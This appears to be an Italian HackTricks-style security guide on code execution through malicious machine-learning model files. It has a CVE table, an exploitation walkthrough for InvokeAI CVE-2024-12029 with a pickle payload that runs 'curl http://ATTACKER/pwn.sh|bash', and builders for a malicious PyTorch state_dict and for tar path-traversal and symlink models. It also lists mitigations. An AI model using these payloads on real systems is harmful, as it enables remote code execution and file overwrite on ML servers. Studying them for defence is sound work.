# Modelli RCE

{{#include ../banners/hacktricks-training.md}}

## Caricamento modelli in RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati nelle macchine degli sviluppatori o nei sistemi di produzione per essere utilizzati. Di solito, i modelli non dovrebbero contenere codice malevolo, ma ci sono alcuni casi in cui il modello può essere utilizzato per eseguire codice arbitrario sul sistema come funzionalità prevista o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della scrittura, questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Strumento**   | **Vulnerabilità (CVE se disponibile)**                                                                                       | **Vettore RCE**                                                                                                                        | **Riferimenti**                             |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------|
| **PyTorch** (Python)       | *Deserializzazione insicura in* `torch.load` **(CVE-2025-32434)**                                                          | Pickle malevolo nel checkpoint del modello porta all'esecuzione di codice (bypassando la protezione `weights_only`)                     | |
| PyTorch **TorchServe**     | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + download di modello malevolo causa esecuzione di codice; deserializzazione RCE in API di gestione                                 | |
| **TensorFlow/Keras**       | **CVE-2021-37678** (YAML non sicuro) <br> **CVE-2024-3660** (Keras Lambda)                                                  | Caricamento del modello da YAML utilizza `yaml.unsafe_load` (esecuzione di codice) <br> Caricamento del modello con layer **Lambda** esegue codice Python arbitrario | |
| TensorFlow (TFLite)        | **CVE-2022-23559** (analisi TFLite)                                                                                         | Modello `.tflite` creato provoca overflow intero → corruzione dell'heap (potenziale RCE)                                               | |
| **Scikit-learn** (Python)  | **CVE-2020-13092** (joblib/pickle)                                                                                          | Caricamento di un modello tramite `joblib.load` esegue pickle con il payload `__reduce__` dell'attaccante                               | |
| **NumPy** (Python)         | **CVE-2019-6446** (unsafe `np.load`) *contestato*                                                                           | `numpy.load` di default consentiva array di oggetti pickle – `.npy/.npz` malevoli provocano esecuzione di codice                       | |
| **ONNX / ONNX Runtime**    | **CVE-2022-25882** (traversal di directory) <br> **CVE-2024-5187** (traversal tar)                                         | Il percorso dei pesi esterni del modello ONNX può uscire dalla directory (leggere file arbitrari) <br> Modello ONNX malevolo tar può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (rischio di design) | *(Nessun CVE)* operazioni personalizzate ONNX / flusso di controllo                                                        | Modello con operatore personalizzato richiede il caricamento del codice nativo dell'attaccante; grafi di modello complessi abusano della logica per eseguire calcoli non intenzionati | |
| **NVIDIA Triton Server**   | **CVE-2023-31036** (traversal di percorso)                                                                                  | Utilizzando l'API di caricamento del modello con `--model-control` abilitato consente la traversata di percorso relativo per scrivere file (ad es., sovrascrivere `.bashrc` per RCE) | |
| **GGML (formato GGUF)**    | **CVE-2024-25664 … 25668** (molti overflow dell'heap)                                                                       | File modello GGUF malformato provoca overflow del buffer dell'heap nel parser, abilitando l'esecuzione di codice arbitrario sul sistema vittima | |
| **Keras (formati più vecchi)** | *(Nessun nuovo CVE)* Modello Keras H5 legacy                                                                                | Modello HDF5 (`.h5`) malevolo con codice Lambda layer continua a eseguire al caricamento (Keras safe_mode non copre il vecchio formato – “attacco di downgrade”) | |
| **Altri** (generale)       | *Difetto di design* – Serializzazione Pickle                                                                                 | Molti strumenti ML (ad es., formati di modello basati su pickle, `pickle.load` di Python) eseguiranno codice arbitrario incorporato nei file modello a meno che non venga mitigato | |

Inoltre, ci sono alcuni modelli basati su pickle di Python, come quelli utilizzati da [PyTorch](https://github.com/pytorch/pytorch/security), che possono essere utilizzati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### 🆕  InvokeAI RCE tramite `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open-source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install` che consente agli utenti di scaricare e caricare modelli da URL arbitrari.

Internamente, l'endpoint alla fine chiama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` esegue una **deserializzazione pickle**. Poiché il contenuto proviene direttamente dall'URL controllato dall'utente, un attaccante può incorporare un oggetto malevolo con un metodo `__reduce__` personalizzato all'interno del checkpoint; il metodo viene eseguito **durante la deserializzazione**, portando a **esecuzione di codice remoto (RCE)** sul server InvokeAI.

La vulnerabilità è stata assegnata **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guida all'esploitazione

1. Crea un checkpoint malevolo:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP che controlli (ad esempio `http://ATTACKER/payload.ckpt`).
3. Attiva l'endpoint vulnerabile (nessuna autenticazione richiesta):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene l'esecuzione di codice nel contesto del processo InvokeAI.

Exploit pronto all'uso: **Metasploit** modulo `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (flag di scansione predefinito **false**)
•  `/api/v2/models/install` raggiungibile dall'attaccante
•  Il processo ha i permessi per eseguire comandi shell

#### Mitigazioni

* Aggiorna a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` per impostazione predefinita e esegue la scansione malware prima della deserializzazione.
* Quando carichi i checkpoint programmaticamente usa `torch.load(file, weights_only=True)` o il nuovo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Applica liste di autorizzazione / firme per le fonti dei modelli e esegui il servizio con il minimo privilegio.

> ⚠️ Ricorda che **qualsiasi** formato basato su pickle di Python (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente insicuro da deserializzare da fonti non attendibili.

---

Esempio di una mitigazione ad hoc se devi mantenere in esecuzione versioni più vecchie di InvokeAI dietro un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Esempio – creazione di un modello PyTorch malevolo

- Crea il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelli per Path Traversal

Come commentato in [**questo post del blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati dei modelli utilizzati da diversi framework AI si basa su archivi, di solito `.zip`. Pertanto, potrebbe essere possibile abusare di questi formati per eseguire attacchi di path traversal, consentendo di leggere file arbitrari dal sistema in cui il modello è caricato.

Ad esempio, con il seguente codice puoi creare un modello che creerà un file nella directory `/tmp` quando caricato:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il seguente codice puoi creare un modello che creerà un symlink alla directory `/tmp` quando caricato:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Riferimenti

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
